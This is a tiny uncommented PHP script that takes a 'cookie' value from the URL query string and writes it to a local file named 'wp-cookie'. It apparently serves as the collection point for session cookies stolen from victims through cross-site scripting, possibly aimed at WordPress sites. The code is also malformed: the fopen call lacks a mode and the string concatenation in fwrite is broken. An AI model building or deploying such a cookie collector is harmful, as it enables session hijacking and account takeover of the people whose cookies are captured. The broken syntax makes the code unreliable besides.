<?php

$cookie = $_GET['cookie'];
$f = fopen('wp-cookie');
fwrite($f, "cookie: "$cookie ' ');






?>